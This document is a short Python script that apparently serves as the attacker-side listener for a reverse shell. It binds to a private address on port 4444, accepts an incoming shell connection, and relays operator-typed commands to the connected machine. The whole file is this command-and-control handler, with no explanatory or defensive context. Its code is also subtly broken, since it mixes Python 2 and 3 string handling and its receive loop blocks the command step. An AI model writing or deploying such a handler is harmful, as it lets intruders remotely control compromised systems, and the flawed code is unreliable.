import socket
import sys

host = "192.168.16.103"
port = 4444

server = socket.socket( socket.AF_INET, socket.SOCK_STREAM )

server.bind( ( host, port ) )
server.listen( 5 )

print("[*] Server bound to %s:%d" % ( host , port ))
connected = False
while 1:

    #accept connections from outside
    if not connected:
        (client, address) = server.accept()
        connected = True

    print("[*] Accepted Shell Connection")
    buffer = ""

    while 1:
        try:
            recv_buffer = client.recv(4096)

            print("[*] Received: %s" % recv_buffer)
            if not len(recv_buffer):
                break
            else:
                buffer += recv_buffer
        except:
            break

    # We've received everything, now it's time to send some input
    command = input("Enter Command> ").encode('utf-8')
    client.sendall( command + b"\r\n\r\n" )
    print("[*] Sent => %s" % command)

